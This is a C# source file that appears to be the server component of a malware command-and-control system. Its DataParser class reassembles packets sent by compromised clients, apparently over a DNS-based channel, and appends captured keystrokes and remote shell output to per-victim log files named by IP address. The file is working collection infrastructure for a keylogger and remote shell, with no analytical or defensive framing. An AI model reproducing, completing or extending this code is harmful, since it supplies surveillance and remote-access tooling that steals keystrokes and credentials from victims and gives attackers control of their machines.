using System.Text;

namespace Server.Models
{
    public enum LogType
    {
        Keylogger,
        Shell
    }

    public class DataParser
    {
        public string ClientIP { get; }
        public DateTime CreatedAt { get; }
        public int LastReceivedPacket { get; private set; }
        
        // Separate packet tracking for keylogger vs shell (independent streams)
        private int _lastReceivedKeylogPacket = -1;
        private int _lastReceivedShellPacket = -1;
        
        private readonly List<byte> _data;
        private readonly string _logBasePath;
        private string? _clientLogPath;
        
        // Buffer for keylogger data (accumulate before writing)
        private StringBuilder _keylogBuffer = new StringBuilder();
        private int _keylogCharCount = 0;
        private const int KEYLOG_BUFFER_SIZE = 50; // Write every 50 chars instead of 10
        
        // Buffer for shell output (accumulate per command)
        private StringBuilder _shellBuffer = new StringBuilder();
        private DateTime? _shellCommandStartTime;

        public DataParser(string clientIP, string logBasePath)
        {
            ClientIP = clientIP;
            CreatedAt = DateTime.Now;
            LastReceivedPacket = -1;
            _data = new List<byte>();
            _logBasePath = logBasePath;
            
            // Create client-specific directory: logs/IP/
            _clientLogPath = Path.Combine(_logBasePath, ClientIP.Replace(":", "_"));
            Directory.CreateDirectory(_clientLogPath);
        }

        public int DataLength => _data.Count;


        public void AddData(int packetNumber, byte[] data)
        {
            if (packetNumber == LastReceivedPacket)
            {
                throw new DuplicatePacketException();
            }
            
            if (!(packetNumber > LastReceivedPacket || packetNumber == 0))
            {
                LastReceivedPacket = 0;
                throw new PacketsOutOfOrderException();
            }

            _data.AddRange(data);
            LastReceivedPacket = packetNumber;
        }
        
        /// <summary>
        /// Add data with separate packet tracking by type (keylogger vs shell)
        /// </summary>
        public void AddDataByType(int packetNumber, byte[] data, LogType logType)
        {
            int lastReceived = logType == LogType.Keylogger ? _lastReceivedKeylogPacket : _lastReceivedShellPacket;
            
            if (packetNumber == lastReceived)
            {
                throw new DuplicatePacketException();
            }
            
            if (!(packetNumber > lastReceived || packetNumber == 0))
            {
                // Reset on out-of-order for this stream
                if (logType == LogType.Keylogger)
                    _lastReceivedKeylogPacket = 0;
                else
                    _lastReceivedShellPacket = 0;
                    
                throw new PacketsOutOfOrderException();
            }

            _data.AddRange(data);
            
            if (logType == LogType.Keylogger)
                _lastReceivedKeylogPacket = packetNumber;
            else
                _lastReceivedShellPacket = packetNumber;
        }


        public string GetAllData()
        {
            return Encoding.ASCII.GetString(_data.ToArray());
        }
        
        public void SaveToFile(string logPath, int connectionId)
        {
            // Legacy method - kept for compatibility
            Directory.CreateDirectory(logPath);
            string filename = Path.Combine(logPath, 
                $"client_{connectionId}_{ClientIP}_{DateTimeOffset.Now.ToUnixTimeSeconds()}.log");
            File.WriteAllText(filename, GetAllData(), Encoding.ASCII);
        }

        /// <summary>
        /// Save data immediately to type-specific log file
        /// </summary>
        public void SaveDataByType(string data, LogType logType)
        {
            if (string.IsNullOrEmpty(_clientLogPath)) return;

            string prefix = logType == LogType.Keylogger ? "keylog" : "shell";
            string date = DateTime.Now.ToString("yyyy-MM-dd");
            string filename = Path.Combine(_clientLogPath, $"{prefix}_{date}.txt");

            if (logType == LogType.Keylogger)
            {
                // Accumulate keylogger data and write every 50 characters
                _keylogBuffer.Append(data);
                _keylogCharCount += data.Length;
                
                if (_keylogCharCount >= KEYLOG_BUFFER_SIZE)
                {
                    string timestamp = DateTime.Now.ToString("HH:mm:ss");
                    string logLine = $"[{timestamp}] {_keylogBuffer}\n";
                    File.AppendAllText(filename, logLine, Encoding.UTF8);
                    
                    _keylogBuffer.Clear();
                    _keylogCharCount = 0;
                }
            }
            else // Shell
            {
                // Buffer shell output until command completes
                if (_shellCommandStartTime == null)
                {
                    _shellCommandStartTime = DateTime.Now;
                }
                
                _shellBuffer.Append(data);
                
                // Detect command completion by checking for prompt ">" at the end
                string currentBuffer = _shellBuffer.ToString();
                if (currentBuffer.TrimEnd().EndsWith(">"))
                {
                    string timestamp = _shellCommandStartTime.Value.ToString("HH:mm:ss");
                    string logLine = $"[{timestamp}] {_shellBuffer}\n";
                    File.AppendAllText(filename, logLine, Encoding.UTF8);
                    
                    _shellBuffer.Clear();
                    _shellCommandStartTime = null;
                }
            }
        }
        
        /// <summary>
        /// Flush any remaining buffered data (call on shutdown)
        /// </summary>
        public void FlushLogs()
        {
            if (_keylogBuffer.Length > 0)
            {
                string date = DateTime.Now.ToString("yyyy-MM-dd");
                string filename = Path.Combine(_clientLogPath!, $"keylog_{date}.txt");
                string timestamp = DateTime.Now.ToString("HH:mm:ss");
                string logLine = $"[{timestamp}] {_keylogBuffer}\n";
                File.AppendAllText(filename, logLine, Encoding.UTF8);
                _keylogBuffer.Clear();
            }
            
            if (_shellBuffer.Length > 0)
            {
                string date = DateTime.Now.ToString("yyyy-MM-dd");
                string filename = Path.Combine(_clientLogPath!, $"shell_{date}.txt");
                string timestamp = (_shellCommandStartTime ?? DateTime.Now).ToString("HH:mm:ss");
                string logLine = $"[{timestamp}] {_shellBuffer}\n";
                File.AppendAllText(filename, logLine, Encoding.UTF8);
                _shellBuffer.Clear();
            }
        }
    }

    public class DuplicatePacketException : Exception { }
    // PacketsOutOfOrderException defined in DNSProtocol.cs to avoid duplication
}
